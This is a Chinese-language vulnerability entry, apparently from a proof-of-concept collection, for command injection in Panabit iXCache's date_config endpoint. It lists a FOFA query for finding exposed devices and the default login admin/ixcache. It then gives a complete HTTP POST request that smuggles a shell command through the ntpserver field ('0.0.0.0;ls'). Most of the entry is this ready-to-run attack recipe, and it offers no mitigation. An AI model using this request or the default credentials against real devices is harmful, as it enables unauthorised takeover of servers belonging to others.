# Panabit iXCache date_config存在后台命令执行漏洞

# 一、漏洞简介
panabit缓存加速产品是一款基于派网公司自研的操作系统（PanaOS）上研发的内容缓存产品。iXCache依靠高稳定性、高可靠性两大特点，可缓存丰富的资源，目前支持Web视频、移动视频、Web音乐、移动音乐、软件下载、应用商店、游戏补丁等八大类资源的缓存。部署灵活、支持交换机镜像和Panabit牵引两种模式，满足不同级别的用户需求。panabit iXCache系统date_config存在命令执行漏洞，攻击者通过漏洞可以执行任意命令，导致服务器失陷。

# 二、影响版本
+ Panabit iXCache

# 三、资产测绘
+ fofa`<font style="color:rgb(255, 0, 0);">title="iXCache"</font>`
+ 特征

![1706801330303-6f77b29b-5337-4c00-9d58-6227a29488d7.png](./img/okCSs9cCa7o9RLED/1706801330303-6f77b29b-5337-4c00-9d58-6227a29488d7-147741.png)

# 四、漏洞复习
1. 使用弱口令`admin/ixcache`登陆系统,获取cookie

![1706801386353-66163cd9-4b54-4c2e-a39f-4d386894b78f.png](./img/okCSs9cCa7o9RLED/1706801386353-66163cd9-4b54-4c2e-a39f-4d386894b78f-179934.png)

2. 使用上一步获取的cookie，执行命令（每次发包需要在登录处重新获取一次cookie）

```plain
POST /cgi-bin/Maintain/date_config HTTP/1.1
Host: 
Cookie: pauser_1626709857_644740=paonline_admin_48217_16289319551;Path=/;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Cookie: pauser_1706355982_749237=paonline_admin_54360_17068008921; pauser_965865545_617716=paonline_admin_59195_9663105331
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

ntpserver=0.0.0.0;ls&year=2021&month=08&day=14&hour=17&minute=04&second=50&tz=Asiz&bcy=Shanghai&ifname=fxp1
```

![1706801467914-c7d947fa-0610-4ec2-95fc-93f6dace587b.png](./img/okCSs9cCa7o9RLED/1706801467914-c7d947fa-0610-4ec2-95fc-93f6dace587b-495631.png)



> 更新: 2024-02-29 23:57:14  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/pm3gifvcepzx9xkc>